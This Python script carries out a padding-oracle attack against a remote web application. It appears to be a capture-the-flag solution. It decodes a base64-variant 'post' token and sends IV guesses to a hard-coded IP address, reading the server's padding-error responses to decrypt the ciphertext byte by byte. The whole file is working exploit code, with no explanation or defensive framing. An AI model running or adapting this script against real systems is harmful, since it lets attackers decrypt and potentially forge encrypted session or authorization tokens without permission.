import base64
import requests

def decode(data):
    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))

def encode(data):
    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def bxor(b1, b2): # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result

def test(url, data):
    r = requests.get(url+'?post={}'.format(data))
    if 'PaddingException' in r.text:
        return False
    else:
        error = r.text.split("\n")[-2]
        print(f"Error: {error[:error.index(':')]} with data: {data}")
        return True

def generate_iv_list(tail):
    iv = b'\x00' * (16 - len(tail) -1)
    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]

def padding_oracle(real_iv, url, data):
    index = 15
    plains = bytes()
    tail = bytes()
    while index >= 0:
        for iv_index, iv in enumerate(generate_iv_list(tail)):
            print(f"\rTesting: {iv_index: >3}", end='\r')
            if test(url, encode(iv+data)):
                print(f"Found: {iv_index: >3} with IV {iv}")
                plains = bytes([(16-index) ^ iv[index]]) + plains
                index -= 1
                tail = bytes([plain ^ (16-index) for plain in plains])
                break
    return bxor(real_iv, plains)

if __name__ == '__main__':
    post = 'H9Ne8B6YCCj2Jw1ZA8QAZPvwZfkUQfXGd53MeACTl5hYFWrHHyZf5NCAQQKpixlylNxi42ASNMBkNwK2s9y2cifno86SfR1bilUjzhysbBjDjwfmEsCGYey1YV!o4j2svwJMeWWljmWxueGU8m!u1S!J9L6NA7W4SNR64YdW6JprGquVj6ggoCTPeguf2AjiIHMQ4ETGUH--cVAOyh-SsA~~'
    url = 'http://35.190.155.168/253cd950e7/'

    i = 1
    plains = bytes()
    data = decode(post)
    length = len(data)
    while True:
        print(f"Testing block {i}")
        if i*16 < length:
            iv = data[(i-1)*16: i*16]
            plains += padding_oracle(iv, url, data[i*16: (i+1)*16])
        else:
            break
        i += 1
    print(plains)
